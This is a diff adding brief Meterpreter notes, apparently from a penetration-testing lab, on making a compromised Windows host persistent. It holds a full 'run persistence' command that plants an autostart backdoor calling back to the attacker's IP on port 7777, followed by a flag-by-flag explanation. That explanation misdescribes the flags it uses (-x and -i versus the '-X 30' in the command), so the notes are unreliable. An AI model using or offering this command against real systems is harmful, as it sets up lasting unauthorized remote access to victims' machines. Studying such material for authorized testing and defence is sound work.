@@ -1,0 +1,17 @@
+##After getting the meterpreter connection:
+
+##We can run this command to see how we can hold our persistence with target:
+
+meterpreter> run persistence -h
+
+## I have wroten here a simple persistence code to hold the connection
+## with the client
+
+meterpreter> run persistence -A -L c:\\ -X 30 -p 7777 -r 10.10.201.88
+
+## This command then will run the persistence script that will start
+## a matching handler (-A), place the Meterpreter at c:\\ on the target
+## system (-L c:\\), starts the listener when the system boots (-x), 
+## checks every 30 seconds for a connection (-i 30), 
+## connects on port 7777 (-p 7777), and connects to the local system (ours) 
+## on IP address 10.10.201.88 .
